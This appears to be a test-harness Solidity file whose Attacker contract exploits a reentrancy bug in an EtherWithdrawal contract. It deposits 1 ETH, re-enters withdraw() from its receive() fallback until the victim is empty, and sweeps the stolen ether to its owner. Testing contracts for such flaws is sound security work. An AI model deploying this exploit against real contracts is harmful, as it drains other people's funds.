// Harness — NOT AI output. Attacker contract that exploits the
// reentrancy bug in EtherWithdrawal.withdraw(). Standard DAO-style
// reentrancy: attacker.attack() deposits 1 ETH, then calls withdraw();
// the receive() fallback re-enters withdraw() before the victim's
// state update fires, repeating until the victim's balance hits 0.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEtherWithdrawal {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IEtherWithdrawal public immutable victim;
    address public immutable owner;
    uint256 public reentryCount;

    constructor(address _victim) {
        victim = IEtherWithdrawal(_victim);
        owner = msg.sender;
    }

    /// @notice Deposit 1 ETH to register a balance, then call withdraw to start the recursion.
    function attack() external payable {
        require(msg.value >= 1 ether, "send at least 1 ETH");
        // Step 1: register a balance entry on the victim. The attack only works
        // if the victim's `balances[address(this)]` is non-zero — `withdraw()`
        // requires it.
        victim.deposit{value: 1 ether}();
        // Step 2: kick off the recursion.
        victim.withdraw();
    }

    /// @notice The fallback is invoked when the victim sends ETH back to us
    /// via `msg.sender.call{value: amount}("")`. We re-enter withdraw()
    /// here, before the victim's state update has run.
    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            reentryCount++;
            victim.withdraw();
        }
    }

    /// @notice Sweep the stolen ETH back to the attacker's EOA.
    function sweep() external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
